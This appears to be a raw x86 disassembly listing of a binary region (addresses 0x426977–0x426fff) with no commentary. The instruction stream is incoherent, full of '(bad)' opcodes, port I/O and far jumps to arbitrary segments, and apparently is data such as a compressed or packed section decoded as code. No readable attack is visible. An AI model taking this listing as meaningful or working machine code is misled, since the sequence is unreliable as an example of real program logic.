  426977:	xchg   esi,eax
  426978:	dec    ecx
  426979:	in     al,dx
  42697a:	cld    
  42697b:	fistp  DWORD PTR [eax-0x33cc6a29]
  426981:	cld    
  426982:	cmp    cl,al
  426984:	cmc    
  426985:	cs pop ss
  426987:	cld    
  426988:	sub    al,bh
  42698a:	push   eax
  42698b:	xchg   esi,eax
  42698c:	xchg   ebp,eax
  42698d:	inc    esi
  42698e:	std    
  42698f:	inc    esi
  426990:	fdivr  QWORD PTR [edi-0x2db5e4b6]
  426996:	add    DWORD PTR [esi-0x3a476813],edi
  42699c:	or     al,0x37
  42699e:	sbb    cl,BYTE PTR [eax]
  4269a0:	mov    ecx,0xebec3154
  4269a5:	xor    DWORD PTR [edi],esp
  4269a7:	ror    BYTE PTR [ebp+0x111f5d01],0xdf
  4269ae:	jne    0x426930
  4269b0:	add    bh,ah
  4269b2:	inc    edi
  4269b3:	(bad)  
  4269b4:	mov    gs,WORD PTR [ebx-0xa6e4726]
  4269ba:	cld    
  4269bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269bc:	dec    esi
  4269bd:	mov    esi,0xea971cd6
  4269c2:	dec    ebp
  4269c3:	xor    al,0x22
  4269c5:	pop    ds
  4269c6:	in     al,0xaa
  4269c8:	pop    es
  4269c9:	sahf   
  4269ca:	mov    ebp,0x59f6eb6e
  4269cf:	pop    ss
  4269d0:	pop    ebp
  4269d1:	in     al,0xe
  4269d3:	int3   
  4269d4:	fsubr  QWORD PTR [ebx+0x54eb1e9d]
  4269da:	clc    
  4269db:	fwait
  4269dc:	xor    esp,eax
  4269de:	dec    eax
  4269df:	xchg   esp,eax
  4269e0:	(bad)
  4269e3:	fucomip st,st(3)
  4269e5:	mov    eax,0x7270f3cb
  4269ea:	(bad)  
  4269eb:	(bad)  
  4269ec:	jg     0x426a14
  4269ee:	test   al,0x6f
  4269f0:	cmp    al,0xc2
  4269f2:	and    BYTE PTR [esi-0x15],dh
  4269f5:	pop    edi
  4269f6:	idiv   esi
  4269f8:	sbb    al,0xf3
  4269fa:	out    dx,eax
  4269fb:	xor    al,0xf8
  4269fd:	rcr    DWORD PTR [ebx],cl
  4269ff:	enter  0xdcbf,0xde
  426a03:	mov    ebp,0x7680de91
  426a08:	out    0xce,eax
  426a0a:	es iret 
  426a0c:	imul   esp,DWORD PTR [edx],0xffffffbd
  426a0f:	push   ebx
  426a10:	xor    ebp,DWORD PTR [esi+0x25]
  426a13:	xchg   esi,eax
  426a14:	and    al,0xde
  426a16:	adc    edx,DWORD PTR [eax-0x3ef68f17]
  426a1c:	aad    0x33
  426a1e:	aaa    
  426a1f:	jns    0x4269ff
  426a21:	ret    
  426a22:	gs iret 
  426a24:	mov    dh,0x52
  426a26:	clc    
  426a27:	or     dl,BYTE PTR [eax]
  426a29:	xchg   esi,eax
  426a2a:	mov    ds:0x4ce6ab18,al
  426a2f:	es cli 
  426a31:	fcomip st,st(1)
  426a33:	in     al,0xc3
  426a35:	ins    DWORD PTR es:[edi],dx
  426a36:	lea    ebp,[ebx]
  426a38:	int3   
  426a39:	inc    ebx
  426a3a:	std    
  426a3b:	push   es
  426a3c:	mov    edx,edi
  426a3e:	or     eax,0x1173e049
  426a43:	enter  0xc8ee,0x5f
  426a47:	adc    bh,BYTE PTR ds:[ebp-0x3a]
  426a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a4c:	adc    edx,DWORD PTR [ecx+0x1d6287fd]
  426a52:	xchg   esp,eax
  426a53:	adc    al,0x5a
  426a55:	lods   eax,DWORD PTR ds:[esi]
  426a56:	imul   ecx,eax,0x26b2a5bf
  426a5c:	adc    DWORD PTR [eax+0x70ebd77e],eax
  426a62:	sub    edi,DWORD PTR [edi]
  426a64:	sub    BYTE PTR [edi],bl
  426a66:	add    al,0x45
  426a68:	mov    ebx,0x5a4a9edf
  426a6d:	jg     0x426a18
  426a6f:	ret    0xc9bc
  426a72:	cld    
  426a73:	push   ds
  426a74:	nop
  426a75:	int3   
  426a76:	mov    DWORD PTR [eax],0xcb02b220
  426a7c:	aam    0xeb
  426a7e:	push   edx
  426a7f:	call   DWORD PTR [edx-0x4e89924d]
  426a85:	iret   
  426a86:	fstp   QWORD PTR [ebx+ebp*8+0x8]
  426a8a:	enter  0x7423,0x3e
  426a8e:	aam    0x99
  426a90:	cmp    bh,bl
  426a92:	cmp    eax,0xbd4cdf72
  426a97:	clc    
  426a98:	xlat   BYTE PTR ds:[ebx]
  426a99:	(bad)  
  426a9a:	std    
  426a9b:	adc    cl,BYTE PTR [edx+0x53]
  426a9e:	inc    esi
  426a9f:	pop    edx
  426aa0:	lea    esi,[eax]
  426aa2:	sub    dh,BYTE PTR [edx]
  426aa4:	in     al,dx
  426aa5:	or     DWORD PTR [esi+ecx*4+0x7f375b6b],ecx
  426aac:	xor    DWORD PTR [ebx-0x2c],edi
  426aaf:	(bad)  
  426ab0:	jmp    0x426a5d
  426ab2:	push   0x38
  426ab4:	fdivr  DWORD PTR [edx-0x22e49b21]
  426aba:	mov    esp,eax
  426abc:	pop    eax
  426abd:	push   eax
  426abe:	sub    eax,0xcd5f0bea
  426ac3:	fldlg2 
  426ac5:	out    dx,al
  426ac6:	pop    edi
  426ac7:	sti    
  426ac8:	sub    bl,dl
  426aca:	cmp    al,0xad
  426acc:	pop    ds
  426acd:	cdq    
  426ace:	sbb    al,0xc8
  426ad0:	or     esp,DWORD PTR [ebp-0x3a5a632]
  426ad6:	add    edx,DWORD PTR [esi]
  426ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ad9:	lds    eax,FWORD PTR [ebx]
  426adb:	jb     0x426b5a
  426add:	pop    edx
  426ade:	ds (bad) 
  426ae0:	cmp    dl,BYTE PTR [ebx-0xb]
  426ae3:	enter  0x903b,0x4b
  426ae7:	enter  0x307c,0x11
  426aeb:	mov    si,0x44a0
  426aef:	ffreep st(7)
  426af1:	push   esp
  426af2:	xor    ch,cl
  426af4:	jmp    0x426aa5
  426af6:	rcl    DWORD PTR ds:0xc87cac46,0xb5
  426afd:	fst    QWORD PTR [eax]
  426aff:	push   eax
  426b00:	adc    al,0xbc
  426b02:	inc    esp
  426b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b04:	jmp    0x426af2
  426b06:	mov    ds:0xd6bdb7d8,eax
  426b0b:	sub    cl,BYTE PTR [edi+ebx*8-0x6ca54f59]
  426b12:	stos   BYTE PTR es:[edi],al
  426b13:	and    eax,0x41fd0bb8
  426b18:	sbb    eax,0xd72aa16a
  426b1d:	push   ss
  426b1e:	out    0xc3,eax
  426b20:	push   ds
  426b21:	pop    edx
  426b22:	dec    edi
  426b23:	jmp    0xe8facc1d
  426b28:	outs   dx,BYTE PTR ds:[esi]
  426b29:	push   esi
  426b2a:	(bad)  
  426b2b:	jecxz  0x426b3c
  426b2d:	in     eax,0x0
  426b2f:	jne    0x426b44
  426b31:	sbb    al,0xfd
  426b33:	ret    0x6bb0
  426b36:	adc    bh,BYTE PTR [ecx]
  426b38:	mov    esi,0x45af5fdf
  426b3d:	xor    bl,ah
  426b3f:	jno    0x426b71
  426b41:	sbb    ch,bh
  426b43:	(bad)  
  426b44:	out    dx,eax
  426b45:	xchg   edi,eax
  426b46:	push   ss
  426b47:	and    bh,ch
  426b49:	push   0x56
  426b4b:	enter  0x5ec,0xda
  426b4f:	pop    ebp
  426b50:	sti    
  426b51:	call   0x94b6:0x14ea9e1a
  426b58:	scas   al,BYTE PTR es:[edi]
  426b59:	bnd je 0x426ba4
  426b5c:	xor    DWORD PTR ds:0xf845c805,0xc021c6c7
  426b66:	mov    ah,0x3f
  426b68:	jmp    0x426ba3
  426b6a:	jnp    0x426b49
  426b6c:	dec    ebp
  426b6d:	call   0xd38eaf16
  426b72:	dec    ebp
  426b73:	iret   
  426b74:	or     ebp,esi
  426b76:	jb     0x426bab
  426b78:	lods   eax,DWORD PTR ds:[esi]
  426b79:	lea    edi,[ebp+0x335120a0]
  426b7f:	mov    esp,0xc8fd2023
  426b84:	int    0x98
  426b86:	call   0x5b642768
  426b8b:	enter  0x2db7,0x5c
  426b8f:	in     eax,dx
  426b90:	push   ebx
  426b91:	leave  
  426b92:	test   al,0xe7
  426b94:	in     al,dx
  426b95:	stos   BYTE PTR es:[edi],al
  426b96:	fild   QWORD PTR [edi+0x46959482]
  426b9c:	cmp    ebx,ebp
  426b9e:	jno    0x426b68
  426ba0:	dec    edx
  426ba1:	push   es
  426ba2:	add    edi,ebp
  426ba4:	mov    edi,0xeb6cc3be
  426ba9:	jmp    0x7b003dd7
  426bae:	push   esi
  426baf:	jmp    0x73654baa
  426bb4:	dec    ebx
  426bb5:	cli    
  426bb6:	aam    0x55
  426bb8:	push   edi
  426bb9:	(bad)  
  426bbb:	jle    0x426bf5
  426bbd:	xchg   DWORD PTR [ebp+0x7d10cb87],esi
  426bc3:	pushf  
  426bc4:	mov    dl,0x40
  426bc6:	mov    ebp,0xfd8894de
  426bcb:	int    0x74
  426bcd:	sti    
  426bce:	mov    bh,0xa0
  426bd0:	fcomp  DWORD PTR [edx-0x8]
  426bd3:	ins    BYTE PTR es:[edi],dx
  426bd4:	gs jne 0x426b90
  426bd7:	dec    eax
  426bd8:	out    0xf8,eax
  426bda:	fist   WORD PTR [ecx-0x9]
  426bdd:	fild   QWORD PTR [ebx+0x51]
  426be0:	test   al,0xa5
  426be2:	ret    0x6a0a
  426be5:	dec    edx
  426be6:	std    
  426be7:	lea    ecx,[edi-0x60a9f483]
  426bed:	mov    eax,ds:0x5dfac816
  426bf2:	call   FWORD PTR [eax-0x46]
  426bf5:	enter  0x2b2,0xec
  426bf9:	dec    esi
  426bfa:	cwde   
  426bfb:	jo     0x426ba7
  426bfd:	xchg   ebp,eax
  426bfe:	shl    dh,1
  426c00:	or     ebx,ebx
  426c02:	lahf   
  426c03:	enter  0x321,0x9c
  426c07:	retf   0xd96a
  426c0a:	xor    DWORD PTR [edx+0xb],0x1652fd51
  426c11:	loope  0x426c8b
  426c13:	outs   dx,BYTE PTR ds:[esi]
  426c14:	push   edx
  426c15:	mov    esi,ecx
  426c17:	(bad)  
  426c18:	lock cmp ah,BYTE PTR [eax-0x13]
  426c1c:	mov    esi,0xeb58d4ec
  426c21:	rcl    DWORD PTR [eax-0x48],0xa7
  426c25:	jmp    0xb4ae:0xea2b70b8
  426c2c:	jne    0x426bcd
  426c2e:	xchg   esp,eax
  426c2f:	adc    dh,BYTE PTR [ecx-0x1278457e]
  426c35:	push   ebp
  426c36:	ins    BYTE PTR es:[edi],dx
  426c37:	push   ds
  426c38:	sar    bh,1
  426c3a:	jmp    0x93c8:0x5e9a79c3
  426c41:	add    eax,0x10b3cba0
  426c46:	aaa    
  426c47:	(bad)  
  426c48:	in     eax,dx
  426c49:	mov    dh,0x7d
  426c4b:	pop    ss
  426c4c:	cli    
  426c4d:	pop    esp
  426c4e:	frstor [ecx]
  426c50:	lahf   
  426c51:	push   edi
  426c52:	mov    dl,0xa0
  426c54:	cmp    al,0xdf
  426c56:	mov    edi,0xc83aa866
  426c5b:	xchg   edi,eax
  426c5c:	and    eax,0x6dc30004
  426c61:	imul   edi,DWORD PTR [edi+0x23],0xb7de4fc7
  426c68:	and    eax,esp
  426c6a:	push   esp
  426c6b:	in     eax,dx
  426c6c:	dec    ebp
  426c6d:	test   al,0x61
  426c6f:	mov    bl,0x6b
  426c71:	in     al,0xa0
  426c73:	mov    ds:0xaa03ba01,al
  426c78:	out    dx,eax
  426c79:	je     0x426cb8
  426c7b:	lock lods al,BYTE PTR ds:[esi]
  426c7d:	repz or eax,0x874b91d7
  426c83:	enter  0xde28,0xe5
  426c87:	add    DWORD PTR [edx],ecx
  426c89:	das    
  426c8a:	push   0xffffffa3
  426c8c:	jmp    0x426c12
  426c8e:	jecxz  0x426c23
  426c90:	outs   dx,DWORD PTR ds:[esi]
  426c91:	aaa    
  426c92:	call   0x33b0:0xffdf3f44
  426c99:	fldz   
  426c9b:	fstp   TBYTE PTR [esi-0x4c]
  426c9e:	std    
  426c9f:	test   eax,0x6f629709
  426ca4:	ret    
  426ca5:	dec    ebp
  426ca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ca7:	repz jno 0x426c89
  426caa:	pop    ebp
  426cab:	jle    0x426d21
  426cad:	aaa    
  426cae:	mov    dl,0xdd
  426cb0:	mov    eax,0x8d28fd00
  426cb5:	lahf   
  426cb6:	shr    BYTE PTR [ebx],1
  426cb8:	cdq    
  426cb9:	xor    eax,0xe863c816
  426cbe:	sub    DWORD PTR [ecx+0x66],eax
  426cc1:	push   edx
  426cc2:	int3   
  426cc3:	xor    eax,0xd4e5b5eb
  426cc8:	les    ebp,FWORD PTR [ecx-0x20c5b320]
  426cce:	push   ebx
  426ccf:	inc    eax
  426cd0:	xchg   ebp,eax
  426cd1:	in     al,0x63
  426cd3:	dec    esi
  426cd4:	leave  
  426cd5:	jecxz  0x426d43
  426cd7:	push   0xffffffeb
  426cd9:	imul   edi,DWORD PTR [esi+0x7e],0x286e9cab
  426ce0:	(bad)  
  426ce1:	fist   WORD PTR [edi-0x80]
  426ce4:	lock pop edx
  426ce6:	jo     0x426cd5
  426ce8:	mov    ds:0x2fc0fce7,eax
  426ced:	stos   BYTE PTR es:[edi],al
  426cee:	lods   eax,DWORD PTR ds:[esi]
  426cef:	adc    BYTE PTR [esi],bh
  426cf1:	mov    eax,eax
  426cf3:	enter  0xb450,0x90
  426cf7:	and    BYTE PTR [ecx],bl
  426cf9:	push   ss
  426cfa:	outs   dx,DWORD PTR es:[esi]
  426cfc:	jmp    0x426d6d
  426cfe:	dec    esi
  426cff:	jno    0x426cf5
  426d01:	std    
  426d02:	jg     0x426d4c
  426d04:	xor    edi,ebx
  426d06:	lahf   
  426d07:	stos   DWORD PTR es:[edi],eax
  426d08:	or     esp,ebx
  426d0a:	ret    
  426d0b:	jbe    0x426cf5
  426d0d:	sar    ah,1
  426d0f:	mov    eax,0xe5129dfe
  426d14:	mov    DWORD PTR [ecx],esp
  426d16:	mov    dl,0xc8
  426d18:	pop    ebx
  426d19:	adc    DWORD PTR [eax+0x5d],ebx
  426d1c:	dec    ebx
  426d1d:	or     eax,0x26f67d33
  426d22:	or     al,0xd1
  426d24:	out    dx,al
  426d25:	mov    al,ds:0xa3f3a812
  426d2a:	xor    DWORD PTR [ebp-0x24],0xffffffe0
  426d2e:	retf   
  426d2f:	std    
  426d30:	ret    
  426d31:	inc    ecx
  426d32:	pop    ecx
  426d33:	mov    BYTE PTR ds:0xeb6b7074,dl
  426d39:	cwde   
  426d3a:	dec    edx
  426d3b:	iret   
  426d3c:	inc    ebx
  426d3d:	pusha  
  426d3e:	loopne 0x426d63
  426d40:	xchg   ebx,eax
  426d41:	fbld   TBYTE PTR [edx+0x7f]
  426d44:	mov    al,0xbf
  426d46:	sub    BYTE PTR ds:0x6d01cd4e,dh
  426d4c:	dec    ebx
  426d4d:	lock cmp al,0xc3
  426d50:	sbb    edi,esi
  426d52:	xchg   ebx,eax
  426d53:	sahf   
  426d54:	cmc    
  426d55:	stos   DWORD PTR es:[edi],eax
  426d56:	inc    ebp
  426d57:	aam    0xeb
  426d59:	popa   
  426d5a:	out    dx,eax
  426d5b:	dec    eax
  426d5c:	jmp    0x649e:0x11a97d1c
  426d63:	sbb    ebp,ebx
  426d65:	mov    ebp,edx
  426d67:	push   edx
  426d68:	xchg   DWORD PTR ds:[edi],esp
  426d6b:	jo     0x426cfa
  426d6d:	in     al,dx
  426d6e:	jecxz  0x426d48
  426d70:	xor    edi,ebx
  426d72:	mov    esi,eax
  426d74:	push   esi
  426d75:	das    
  426d76:	test   al,0xba
  426d78:	in     eax,dx
  426d79:	daa    
  426d7a:	pop    edi
  426d7b:	add    al,0xe5
  426d7d:	pop    edi
  426d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d7f:	js     0x426dee
  426d81:	mov    ah,0x64
  426d83:	sbb    al,0xc1
  426d85:	fild   QWORD PTR [edi]
  426d87:	inc    esi
  426d88:	adc    esi,eax
  426d8a:	repnz mov eax,ds:0xafd8fd99
  426d90:	add    bl,BYTE PTR [ecx+0x528374fc]
  426d96:	xchg   ebp,eax
  426d97:	cli    
  426d98:	icebp  
  426d99:	(bad)  
  426d9b:	lods   eax,DWORD PTR ds:[esi]
  426d9c:	aam    0xd9
  426d9e:	push   eax
  426d9f:	sub    BYTE PTR [eax],0xc0
  426da2:	cld    
  426da3:	xchg   edx,eax
  426da4:	push   ebx
  426da5:	fsubr  DWORD PTR [eax+0x49]
  426da8:	mov    ds:0x23c85619,eax
  426dad:	jmp    0xff9aa7ca
  426db2:	(bad)  
  426db3:	mov    dh,0xeb
  426db5:	or     bh,BYTE PTR [esi]
  426db7:	shl    BYTE PTR [edi],cl
  426db9:	dec    edx
  426dba:	mov    al,ds:0x47df0bbb
  426dbf:	(bad)  
  426dc0:	iret   
  426dc1:	push   ecx
  426dc2:	or     DWORD PTR [ecx-0x7f],esp
  426dc5:	repnz cld 
  426dc7:	push   esi
  426dc8:	pushf  
  426dc9:	mov    bh,0x93
  426dcb:	cwde   
  426dcc:	add    cl,bl
  426dce:	dec    eax
  426dcf:	iret   
  426dd0:	fst    DWORD PTR [esi+0x3c]
  426dd3:	leave  
  426dd4:	mov    ebp,DWORD PTR [ebp+0x33]
  426dd7:	loope  0x426e16
  426dd9:	inc    eax
  426dda:	popf   
  426ddb:	iret   
  426ddc:	mul    BYTE PTR [edx]
  426dde:	sbb    DWORD PTR [esi+0x7d3dd2eb],0x3a
  426de5:	popf   
  426de6:	mov    bl,0xc8
  426de8:	mov    dh,0x30
  426dea:	jno    0x426dc4
  426dec:	push   ebx
  426ded:	sub    dl,BYTE PTR [edi+0xf62eb55]
  426df3:	push   esi
  426df4:	bound  edi,QWORD PTR [ebx+eax*2-0x5d]
  426df8:	dec    eax
  426df9:	fistp  QWORD PTR [esi-0x4b]
  426dfc:	inc    ebp
  426dfd:	mov    ecx,0x715dc375
  426e02:	std    
  426e03:	add    DWORD PTR [esi],ecx
  426e05:	in     al,dx
  426e06:	lahf   
  426e07:	scas   eax,DWORD PTR es:[edi]
  426e08:	cdq    
  426e09:	out    dx,eax
  426e0a:	js     0x426dd4
  426e0c:	push   0x57
  426e0e:	sub    dh,cl
  426e10:	or     DWORD PTR [edx],edi
  426e12:	push   es
  426e13:	mov    dh,0xeb
  426e15:	jns    0x426dd0
  426e17:	and    al,0x2
  426e19:	push   ss
  426e1a:	out    0x7a,eax
  426e1c:	pop    ebx
  426e1d:	icebp  
  426e1e:	mov    ds:0xefdf2602,al
  426e23:	imul   edx,DWORD PTR [eax],0xffffffbe
  426e26:	push   cs
  426e27:	inc    esp
  426e28:	in     al,dx
  426e29:	sti    
  426e2a:	hlt    
  426e2b:	popa   
  426e2c:	add    bl,BYTE PTR [edx+0xbaf58]
  426e32:	jo     0x426dfc
  426e34:	lds    esp,FWORD PTR [esi-0x52]
  426e37:	jmp    0x54dff9bd
  426e3c:	jmp    0x426ea6
  426e3e:	shr    edx,1
  426e40:	xchg   edx,eax
  426e41:	loopne 0x426e41
  426e43:	test   BYTE PTR [eax+0xaf4f7df],ah
  426e49:	lea    esi,[ebx+0x50]
  426e4c:	ja     0x426e74
  426e4e:	cld    
  426e4f:	push   edi
  426e50:	scas   al,BYTE PTR es:[edi]
  426e51:	outs   dx,DWORD PTR ds:[esi]
  426e52:	sbb    eax,0x1cb7865d
  426e57:	(bad)  
  426e58:	push   0x2a
  426e5a:	hlt    
  426e5b:	(bad)  
  426e5c:	in     al,dx
  426e5d:	clc    
  426e5e:	sub    ah,bl
  426e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e61:	pop    ds
  426e62:	xchg   esp,eax
  426e63:	xor    al,0x97
  426e65:	cs (bad) 
  426e67:	ja     0x426ec5
  426e69:	mov    edi,0x355647d7
  426e6e:	cdq    
  426e6f:	cs xchg ebx,eax
  426e71:	add    DWORD PTR ds:0x1ddfd6e0,edi
  426e77:	call   0x7feb:0x96cd568f
  426e7e:	pop    edi
  426e7f:	add    DWORD PTR [ebp-0x348e66bf],0xeb16800b
  426e89:	xor    eax,0x328d7f30
  426e8e:	and    eax,0xa8fb8b70
  426e93:	pop    esi
  426e94:	(bad)
  426e98:	mov    BYTE PTR [edi+edi*2+0x3be12ff4],dh
  426e9f:	add    al,0xeb
  426ea1:	push   ebp
  426ea2:	rcl    BYTE PTR [edi+edi*8-0xb],0x9c
  426ea7:	outs   dx,BYTE PTR ds:[esi]
  426ea8:	out    0xde,eax
  426eaa:	push   cs
  426eab:	xor    al,0x17
  426ead:	jne    0x426f15
  426eaf:	into   
  426eb0:	cmovg  edi,DWORD PTR [ecx+eax*1-0x4e816515]
  426eb8:	adc    edx,esp
  426eba:	addr16 aam 0x85
  426ebd:	jmp    0x7a76:0x6b18f3eb
  426ec4:	or     al,ah
  426ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ec7:	cmp    al,0x4c
  426ec9:	and    BYTE PTR [esi],0x28
  426ecc:	out    0x58,eax
  426ece:	call   0x87583428
  426ed3:	scas   al,BYTE PTR es:[edi]
  426ed4:	jmp    0x426ef7
  426ed6:	xor    bl,BYTE PTR [edx]
  426ed8:	inc    esi
  426ed9:	fisubr DWORD PTR [edx-0x674c3638]
  426edf:	xor    ebx,DWORD PTR [eax+0x19]
  426ee2:	xchg   esp,eax
  426ee3:	xor    ebx,ebp
  426ee5:	loope  0x426e7d
  426ee7:	std    
  426ee8:	ret    0x4b1b
  426eeb:	sbb    BYTE PTR [ebx+0x257b55df],al
  426ef1:	mul    al
  426ef3:	mov    dl,0x3f
  426ef5:	clc    
  426ef6:	cld    
  426ef7:	or     eax,0x9cff8f06
  426efc:	inc    edi
  426efd:	loop   0x426ee3
  426eff:	(bad)  
  426f00:	popa   
  426f01:	jo     0x426ec6
  426f03:	mov    dh,0xd3
  426f05:	jl     0x426efd
  426f07:	shl    DWORD PTR [ecx+0x3422fceb],0x7d
  426f0e:	popa   
  426f0f:	push   ss
  426f10:	xchg   ebx,eax
  426f11:	mov    ebp,0xfd65c84f
  426f16:	push   edi
  426f17:	jmp    0x4b6db5a
  426f1c:	jmp    0x426ee2
  426f1e:	fwait
  426f1f:	mov    gs,WORD PTR [edx-0x519ce2bc]
  426f25:	push   es
  426f26:	push   ss
  426f27:	cdq    
  426f28:	jmp    0x426f81
  426f2a:	sbb    al,0x46
  426f2c:	pop    eax
  426f2d:	pop    ss
  426f2e:	push   ebx
  426f2f:	xor    bl,ch
  426f31:	or     BYTE PTR [eax+0x49a54ec3],dh
  426f37:	loope  0x426fa4
  426f39:	fisttp WORD PTR [edi]
  426f3b:	ins    DWORD PTR es:[edi],dx
  426f3c:	scas   al,BYTE PTR es:[edi]
  426f3d:	fcomp  QWORD PTR [eax+0x38cf583]
  426f43:	clc    
  426f44:	fwait
  426f45:	(bad)  
  426f47:	and    bh,BYTE PTR [edi+0x5e]
  426f4a:	pop    ebp
  426f4b:	xchg   ebx,eax
  426f4c:	or     ebp,eax
  426f4e:	(bad)  
  426f4f:	jne    0x426f5e
  426f51:	fistp  QWORD PTR [ebx+0x66]
  426f54:	inc    esi
  426f55:	mov    dh,BYTE PTR [ecx]
  426f57:	sub    ch,bl
  426f59:	mov    bh,0x96
  426f5b:	cmp    DWORD PTR [esi],edi
  426f5d:	adc    DWORD PTR [ecx+eax*4],edi
  426f60:	inc    ecx
  426f61:	loopne 0x426fc6
  426f63:	add    BYTE PTR [ebp+edi*2+0x17],bl
  426f67:	test   al,0xdb
  426f69:	fstp   QWORD PTR [ecx]
  426f6b:	cwde   
  426f6c:	fwait
  426f6d:	push   eax
  426f6e:	std    
  426f6f:	dec    esp
  426f70:	pop    edi
  426f71:	call   0xee0c:0x6d015577
  426f78:	pop    esi
  426f79:	sub    ch,dl
  426f7b:	ret    
  426f7c:	xchg   ebx,eax
  426f7d:	xor    al,0x62
  426f7f:	pop    es
  426f80:	iret   
  426f81:	int    0x71
  426f83:	adc    BYTE PTR [ebx],ch
  426f85:	xor    al,0xbb
  426f87:	mov    ecx,0x24ec8fea
  426f8c:	sbb    esp,0x5
  426f8f:	clc    
  426f90:	lods   al,BYTE PTR ds:[esi]
  426f91:	mov    bl,0xb6
  426f93:	enter  0xf86c,0xa
  426f97:	and    DWORD PTR [esi+ebp*8-0x761491a3],0x3a
  426f9f:	repz in al,dx
  426fa1:	cld    
  426fa2:	ins    BYTE PTR es:[edi],dx
  426fa3:	adc    BYTE PTR [esi],ah
  426fa5:	fnsave [ebx+0x9]
  426fa8:	xor    BYTE PTR [edi],dh
  426faa:	pop    ecx
  426fab:	fisubr DWORD PTR [ebx]
  426fad:	mov    BYTE PTR [esi+0x3f51eb89],dl
  426fb3:	mov    ebx,DWORD PTR [ebx]
  426fb5:	test   al,0x1
  426fb7:	inc    eax
  426fb8:	(bad)  
  426fb9:	xchg   edi,edi
  426fbb:	jnp    0x426f70
  426fbd:	repnz jmp FWORD PTR [esi]
  426fc0:	sub    ah,ah
  426fc2:	pop    ds
  426fc3:	std    
  426fc4:	xor    ebx,DWORD PTR [ecx+ecx*1+0x533eeb80]
  426fcb:	push   es
  426fcc:	inc    edx
  426fcd:	test   DWORD PTR [eax-0x6c],esp
  426fd0:	call   0x1ca5:0x169bdcd8
  426fd7:	cmp    ch,BYTE PTR [edx-0x6f]
  426fda:	pop    ecx
  426fdb:	sub    bl,0x51
  426fde:	and    eax,DWORD PTR [ebp-0xab83751]
  426fe4:	mov    edi,ds
  426fe6:	xor    al,0x91
  426fe8:	mov    al,ds:0x23c8ff4c
  426fed:	cmp    ch,0x52
  426ff0:	pop    ebx
  426ff1:	mov    ah,0x70
  426ff3:	xchg   BYTE PTR [ecx-0x11],al
  426ff6:	enter  0xe0c8,0xd
  426ffa:	dec    edi
  426ffb:	ds hlt 
  426ffd:	add    BYTE PTR [eax],al
  426fff:	add    BYTE PTR [eax+0x0],cl
	...
